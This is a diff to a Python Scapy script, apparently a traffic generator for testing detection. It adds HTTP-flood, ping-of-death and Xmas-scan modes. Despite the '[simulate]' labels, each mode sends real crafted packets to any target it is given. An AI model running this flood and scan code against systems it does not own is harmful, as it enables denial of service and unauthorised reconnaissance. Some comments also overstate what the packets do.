@@ -80,6 +80,24 @@ def udp_flood(target:str,count:int=200):
     send(IP(dst=target)/UDP(dport=RandShort()), count=count, verbose=False)
     # verbose=False means do not print the packet
 
+def http_flood(target: str, count: int = 500):
+    # HTTP flood is a type of DDoS attack that overwhelms a web server with seemingly valid HTTP requests (like GET/POST).
+    print(f"[simulate] HTTP flood → {target}")
+    # We simulate this by sending TCP packets with the Push/ACK flags, representing data payloads on port 80.
+    send(IP(dst=target)/TCP(dport=80, flags="PA", sport=RandShort()), count=count, verbose=False)
+
+def ping_of_death(target: str, count: int = 50):
+    # Ping of Death sends malformed or oversized ICMP packets.
+    # We simulate it by creating a very large payload for the ICMP packet.
+    print(f"[simulate] Ping of Death → {target}")
+    send(IP(dst=target)/ICMP()/(b"X" * 60000), count=count, verbose=False)
+
+def xmas_scan(target: str, count: int = 100):
+    # Xmas scan is a reconnaissance technique that sets the FIN, PSH, and URG flags.
+    # It attempts to bypass simple stateless firewalls.
+    print(f"[simulate] Xmas scan → {target}")
+    send(IP(dst=target)/TCP(dport=RandShort(), flags="FPU"), count=count, verbose=False)
+
 
 # __name__ is a special variable in python that is used to determine if the script is run as a standalone program or as a module
 # if the script is run as a standalone program, then __name__ is set to "__main__"
@@ -97,7 +115,7 @@ if __name__ == "__main__":
     # --mode is the name of the argument
     # choices=["syn_flood","icmp_sweep","port_scan"] means that the argument can only have these values
     # required=True means that the argument is required
-    ap.add_argument("--mode",   choices=["syn_flood","icmp_sweep","port_scan","udp_flood"], required=True)
+    ap.add_argument("--mode",   choices=["syn_flood","icmp_sweep","port_scan","udp_flood","http_flood","ping_of_death","xmas_scan"], required=True)
     # --target is the name of the argument
     # required=True means that the argument is required
     ap.add_argument("--target", required=True)
@@ -114,4 +132,4 @@ if __name__ == "__main__":
     # *([args.count] if args.mode != "port_scan" else []) is a list that is used to store the count
     # if the mode is not "port_scan", then the count is passed to the function
     # if the mode is "port_scan", then the count is not passed to the function
-    {"syn_flood": syn_flood, "icmp_sweep": icmp_sweep, "port_scan": port_scan,"udp_flood":udp_flood}[args.mode](args.target, *([args.count] if args.mode != "port_scan" else []))
+    {"syn_flood": syn_flood, "icmp_sweep": icmp_sweep, "port_scan": port_scan,"udp_flood":udp_flood,"http_flood":http_flood,"ping_of_death":ping_of_death,"xmas_scan":xmas_scan}[args.mode](args.target, *([args.count] if args.mode != "port_scan" else []))
